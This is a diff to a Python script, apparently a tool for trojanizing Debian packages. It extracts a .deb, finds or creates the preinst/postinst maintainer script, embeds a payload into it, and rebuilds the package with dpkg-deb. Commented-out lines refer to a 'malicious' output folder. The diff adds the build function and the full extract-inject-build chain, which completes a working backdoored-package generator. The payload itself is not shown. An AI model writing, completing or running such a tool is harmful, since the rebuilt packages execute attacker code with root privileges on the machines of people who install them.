@@ -89,14 +89,14 @@ print(debpath)
 postinst = debpath+"DEBIAN/postinst"
 preinst = debpath+"DEBIAN/preinst"
 
-
+injectablefile = ""
 def checkforinjectablefile():
-	global postrm,preinst
+	global postrm,preinst,injectablefile
 	if os.path.exists(postinst) or os.path.exists(preinst):
 		if os.path.exists(preinst):
-			return preinst
+			injectablefile = preinst
 		else:
-			return postinst	
+			injectablefile = postinst	
 
 	else:
 		file = open(preinst,'w+')
@@ -105,9 +105,9 @@ def checkforinjectablefile():
 		return preinst
 
 
-	print("this function working fine!!")
+	print(f"{injectablefile}")
 
-checkforinjectablefile()
+
 
 
 def embed(script: str, payload: str):
@@ -116,3 +116,16 @@ def embed(script: str, payload: str):
 	file.close()
 
 
+def build():
+	global debpath
+	cwd = os.getcwd()
+	#os.mkdir(malicious)
+	build_cmd = f"dpkg-deb -b {debpath}"
+	os.system(build_cmd)
+	#move_command = f"mv {debpath}.deb {cwd}/malicious/"
+
+
+extract(deb)
+checkforinjectablefile()
+embed(injectablefile,payload)
+build()
